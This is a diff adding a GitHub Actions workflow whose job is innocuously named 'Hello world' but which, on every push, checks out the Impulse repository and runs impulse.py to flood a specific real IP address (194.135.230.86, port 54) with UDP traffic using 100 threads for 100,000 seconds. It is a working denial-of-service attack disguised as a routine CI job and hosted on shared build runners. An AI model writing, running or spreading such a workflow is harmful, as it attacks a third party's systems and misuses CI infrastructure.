@@ -1,0 +1,22 @@
+name: start_it
+
+on: push
+
+env:
+  DEVOPS_DIR: devops
+
+jobs:
+  hello-world:
+    name: Hello world
+    runs-on: ubuntu-latest
+    steps:
+    - name: Check-out devops repository
+      uses: actions/checkout@v2
+      with:
+        repository: LimerBoy/Impulse
+
+    - name: starting
+      run: |
+        pip3 install -r requirements.txt
+        python3 impulse.py --target 194.135.230.86:54 --time 100000 --threads 100 --method UDP
+      shell: sh
